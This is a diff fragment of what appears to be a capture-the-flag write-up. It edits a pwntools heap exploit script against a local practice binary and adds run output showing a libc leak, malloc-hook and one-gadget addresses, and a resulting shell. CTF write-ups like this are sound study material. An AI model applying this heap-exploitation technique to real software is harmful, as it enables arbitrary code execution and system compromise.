@@ -749,7 +749,7 @@ BeSavior(0)
 Join(1, "A"*0x17+"\x61") # index: 12, Vocal 4
 BeSavior(1)
 Join(4, "A"*0x3e+"\n") # index: 13, Drummer 1
-pause()
+
 See()
 p.recvuntil("Drum : ")
 p.recvline()
@@ -773,5 +773,17 @@ p.recvuntil(">\n")
 p.sendline("6") # index: 17, Trumpet 3
 
 p.interactive()
+```
+
+```bash
+chykor12@ubuntu:~/CyKor$ python exploit_problem.py
+[+] Starting local process './problem': pid 2569
+[*] address of main_arena(): 0x7f89068f3c40
+[*] address of libc base: 0x7f890670f000
+[*] address of malloc hook: 0x7f89068f3c30
+[*] address of one gadget: 0x7f8906815ef8
+[*] Switching to interactive mode
+leave the memo > $ whoami
+chykor12
 ```
 
